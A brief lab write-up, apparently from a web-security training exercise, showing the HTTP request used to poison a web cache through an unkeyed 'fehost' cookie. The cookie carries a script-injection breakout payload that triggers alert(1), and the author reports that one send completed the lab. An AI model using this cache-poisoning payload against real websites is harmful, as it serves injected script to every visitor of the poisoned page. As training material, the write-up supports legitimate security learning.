Web cache poisoning with an unkeyed cookie

Slightly tricky to get working. Here's the request I used, it includes the cache buster and the payload:

GET / HTTP/1.1
Host: ac331f3b1e5ceaeb807503f1009f00d9.web-security-academy.net

Cookie: session=hw6aQOBAzDiPbXD56r2U738XZlCkTnfy; fehost=someString"-alert(1)-"someString
Connection: close
Upgrade-Insecure-Requests: 1



In my case I only had to send it once to trigger the lab completion.
